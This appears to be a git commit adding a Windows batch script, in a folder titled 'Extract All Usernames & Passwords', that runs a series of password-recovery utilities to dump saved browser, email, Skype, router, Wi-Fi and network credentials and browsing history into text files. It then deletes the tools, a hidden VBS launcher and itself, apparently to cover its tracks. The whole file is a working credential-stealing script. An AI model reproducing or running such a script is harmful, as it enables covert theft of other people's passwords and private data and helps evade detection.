d960d7a8845c2a03ab6a2624127bf0654ee06cad
akhil1136 <47243201+akhil1136@users.noreply.github.com>
2019-02-20 12:22:26 +0530

    Add files via upload

---
+++ Extract All Usernames & Passwords/TheRealAnnoyance.bat
@@ -0,0 +1,41 @@
+timeout 3
+%~dp0/WebBrowserPassView.exe /stext WebBrowserPassView.txt
+%~dp0/SkypeLogView.exe /stext SkypeLogView.txt
+%~dp0/RouterPassView.exe /stext RouterPassView.txt
+%~dp0/pspv.exe /stext pspv.txt
+%~dp0/PasswordFox.exe /stext PasswordFox.txt
+%~dp0/OperaPassView.exe /stext OperaPassView.txt
+%~dp0/mspass.exe /stext mspass.txt
+%~dp0/mailpv.exe /stext mailpv.txt
+%~dp0/iepv.exe /stext iepv.txt
+%~dp0/ChromePass.exe /stext ChromePass.txt
+%~dp0/ChromeHistoryView.exe /stext ChromeHistoryView.txt
+%~dp0/BulletsPassView.exe /stext BulletsPassView.txt
+%~dp0/BrowsingHistoryView.exe /stext BrowsingHistoryView.txt
+%~dp0/WirelessKeyView.exe /stext WirelessKeyView.txt
+%~dp0/netpass.exe /stext netpass.txt
+%~dp0/Dialupass.exe /stext Dialupass.txt
+%~dp0/WirelessKeyView.exe /stext WirelessKeyView.txt
+
+del /S WebBrowserPassView.exe && ECHO Y
+del /S SkypeLogView.exe && ECHO Y
+del /S RouterPassView.exe && ECHO Y
+del /S pspv.exe && ECHO Y
+del /S PasswordFox.exe && ECHO Y
+del /S OperaPassView.exe && ECHO Y
+del /S mspass.exe && ECHO Y
+del /S mailpv.exe && ECHO Y
+del /S iepv.exe && ECHO Y
+del /S ChromePass.exe && ECHO Y
+del /S ChromeHistoryView.exe && ECHO Y 
+del /S BulletsPassView.exe && ECHO Y
+del /S BrowsingHistoryView.exe && ECHO Y
+del /S WirelessKeyView.exe && ECHO Y
+del /S netpass.exe && ECHO Y
+del /S Dialupass.exe && ECHO Y
+del /S SniffPass.exe && ECHO Y
+del /S PasswordFox64.exe && ECHO Y
+del /S invisible.vbs && ECHO Y
+del /S TheRealAnnoyance.bat && ECHO Y
+
+
